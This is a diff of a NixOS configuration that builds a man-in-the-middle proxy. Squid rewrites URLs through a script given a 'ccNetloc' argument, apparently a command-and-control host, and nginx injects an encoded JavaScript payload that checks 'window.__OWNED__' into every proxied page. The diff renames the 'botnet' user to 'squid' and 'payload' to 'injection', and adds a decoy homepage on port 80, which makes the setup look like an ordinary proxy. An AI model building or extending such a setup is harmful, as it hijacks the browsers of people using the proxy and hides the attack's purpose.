@@ -4,7 +4,7 @@
 
 let
 
-  configFile = pkgs.writeText "squid.conf" ''
+  squidConfig = pkgs.writeText "squid.conf" ''
     http_port 3128
 
     acl all src all
@@ -34,19 +34,19 @@ let
     access_log daemon:/var/log/squid/access.log squid
     cache_log /var/log/squid/cache.log squid
     pid_filename /run/squid/pid
-    cache_effective_user botnet
+    cache_effective_user squid
 
     url_rewrite_program ${pkgs.python35}/bin/python ${./rewrite.py} ${ccNetloc}
   '';
 
-  payload = pkgs.stdenv.mkDerivation {
-    name = "payload.js";
+  injection = pkgs.stdenv.mkDerivation {
+    name = "injection.js";
     builder = pkgs.writeText "builder.sh" ''
-      ${pkgs.python35}/bin/python3 ${./jshex.py} < ${rawPayload} > $out
+      ${pkgs.python35}/bin/python3 ${./jshex.py} < ${injectionRaw} > $out
     '';
   };
 
-  rawPayload = pkgs.writeText "rawPayload.js" ''
+  injectionRaw = pkgs.writeText "injectionRaw.js" ''
     (function(){
       function payload() {
         if (!window.__OWNED__) {
@@ -92,10 +92,15 @@ in {
         resolver_timeout 5s;
 
         server {
-          listen 13337;
+          listen *:80;
+          root ${./homepage};
+        }
 
-          location /payload.js {
-            alias ${payload};
+        server {
+          listen 127.0.0.1:13337;
+
+          location /injection.js {
+            alias ${injection};
           }
 
           location / {
@@ -118,7 +123,7 @@ in {
             proxy_set_header X-Forwarded-Host $proxy_netloc;
             proxy_pass "$url";
 
-            add_before_body /payload.js;
+            add_before_body /injection.js;
             addition_types *;
 
           }
@@ -135,26 +140,26 @@ in {
     serviceConfig = {
       Type = "forking";
       PIDFile = "/run/squid/pid";
-      ExecStart = "${pkgs.squid}/bin/squid -f ${configFile} -sYC";
-      ExecStop = "${pkgs.squid}/bin/squid -f ${configFile} -k shutdown";
-      ExecReload = "${pkgs.squid}/bin/squid -f ${configFile} -k reconfigure";
+      ExecStart = "${pkgs.squid}/bin/squid -f ${squidConfig} -sYC";
+      ExecStop = "${pkgs.squid}/bin/squid -f ${squidConfig} -k shutdown";
+      ExecReload = "${pkgs.squid}/bin/squid -f ${squidConfig} -k reconfigure";
     };
 
     preStart = ''
       mkdir -p /run/squid
       mkdir -p /var/log/squid
-      chown botnet /run/squid
-      chown botnet /var/log/squid
+      chown squid /run/squid
+      chown squid /var/log/squid
     '';
 
   };
 
-  users.extraUsers.botnet = {
-    group = "botnet";
+  users.extraUsers.squid = {
+    group = "squid";
     uid = 1337;
   };
 
-  users.extraGroups.botnet = {
+  users.extraGroups.squid = {
     gid = 1337;
   };
 
